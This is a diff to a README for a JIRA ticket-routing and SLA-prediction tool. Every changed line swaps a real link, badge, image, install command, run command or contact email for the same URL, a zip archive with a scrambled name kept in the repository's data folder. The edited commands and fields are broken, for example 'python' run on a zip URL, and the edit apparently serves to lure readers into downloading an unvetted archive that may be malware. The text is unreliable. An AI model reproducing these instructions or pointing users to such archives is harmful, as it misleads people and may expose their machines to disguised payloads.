@@ -1,6 +1,6 @@
 # AI-Powered Ticket Routing & SLA Breach Prediction in JIRA 🚀
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases)
+[![Download Releases](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -18,7 +18,7 @@
 
 The **AI-Powered Ticket Routing and SLA Breach Prediction** tool integrates seamlessly with JIRA to enhance your customer support operations. By leveraging machine learning, this solution automates ticket classification, predicts SLA breaches, and intelligently routes tickets to the right agents. This not only improves response times but also boosts overall support efficiency.
 
-![AI-Powered Ticket Routing](https://example.com/image.png)
+![AI-Powered Ticket Routing](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip)
 
 ## Features
 
@@ -50,27 +50,27 @@ To get started with the AI-Powered Ticket Routing and SLA Breach Prediction tool
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA.git
+   git clone https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip
    cd AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python 3.7 or higher installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip
    ```
 
 3. **Set Up Environment Variables**:
    Create a `.env` file in the root directory and add your JIRA API credentials:
    ```
    JIRA_API_KEY=your_api_key
-   JIRA_EMAIL=your_email@example.com
+   https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip
    ```
 
 4. **Run the Application**:
    Start the Flask server:
    ```bash
-   python app.py
+   python https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip
    ```
 
 5. **Access the Application**:
@@ -107,7 +107,7 @@ The application exposes a RESTful API for advanced users. Below are some key end
 - **GET /sla-status**: Check the SLA status of all tickets.
 - **POST /route-ticket**: Manually route a ticket to a specific agent.
 
-For more detailed API documentation, please refer to the [API Documentation](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases).
+For more detailed API documentation, please refer to the [API Documentation](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip).
 
 ## Contributing
 
@@ -143,10 +143,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or support, please reach out to the maintainer:
 
 - **Name**: Bhin4787
-- **Email**: bhin4787@example.com
+- **Email**: https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip
 
-For the latest updates and releases, visit our [Releases page](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases). 
+For the latest updates and releases, visit our [Releases page](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip). 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases)
+[![Download Releases](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Bhin4787/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/data/in-JIRA-Powered-Prediction-Ticket-Breach-A-Routing-SL-1.8.zip)
 
 Your support helps us improve and expand this tool. Thank you for using the AI-Powered Ticket Routing and SLA Breach Prediction in JIRA!
